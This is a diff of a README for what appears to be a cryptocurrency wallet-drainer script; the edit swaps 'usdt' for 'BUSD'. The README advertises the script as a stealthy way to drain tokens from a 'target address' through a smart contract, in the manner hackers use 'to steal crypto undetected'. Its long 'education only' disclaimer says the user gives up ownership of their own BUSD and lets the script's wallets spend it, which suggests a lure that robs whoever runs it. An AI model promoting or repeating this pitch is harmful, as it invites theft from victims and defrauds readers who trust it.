@@ -15,7 +15,7 @@ VICTIM ----> CUSTOM SMART CONTRACT -----> YOUR BSC ADDRESS
 
 The !!! smart contract address !!! appears in the transaction not yours this is for stealth
 
-This script will let you drain usdt from the target address
+This script will let you drain BUSD from the target address
 
 This is a free community code that anyone can audit or edit with pull request and works as designed its been used by pro hackers for years to steal crypto undetected i didnt write this script im just sharing it to show how hackers steal crypto
 
@@ -108,6 +108,6 @@ terms and conditions
 
 by using this script you void all rights to sue or prosicute the developers and using this script to hack others will only hold the hackers responsible for legal and civil actions that may arise from exploiting others this script is only intended to educate people on how this scam works. This script is only intended to be used to educate people its not intended to be used for real world situations. Do not use this script to scam other people. Do not use this script with money you intend to keep. By using this script you agree to these terms and services if you do not want to agree to these terms do not use this script.
 
-Disclamer: i do not promote hacking i just want to share how hackers have been draining millions of dollars so that the community can learn about it by using this free script you accept the terms that i will not be held responsible for damages arising from the use and damages arising from improperly using this script to hack others or testing. the reason for this script is for purely education purposes only this script is not intended to be used for illegal purposes all content of this script is only there to educate people to avoid being scammed. By using this script you void all ownership of the usdt in your wallet and all transfers done by this script is legal and not prosicutable by the testers. And as the user of this script you allow all wallets used by this script to access spend and use your usdt.Moneywithbots is not the creator of this script and does not own any wallets associated with this script.
+Disclamer: i do not promote hacking i just want to share how hackers have been draining millions of dollars so that the community can learn about it by using this free script you accept the terms that i will not be held responsible for damages arising from the use and damages arising from improperly using this script to hack others or testing. the reason for this script is for purely education purposes only this script is not intended to be used for illegal purposes all content of this script is only there to educate people to avoid being scammed. By using this script you void all ownership of the BUSD in your wallet and all transfers done by this script is legal and not prosicutable by the testers. And as the user of this script you allow all wallets used by this script to access spend and use your usdt.Moneywithbots is not the creator of this script and does not own any wallets associated with this script.
 
 End of disclamer.
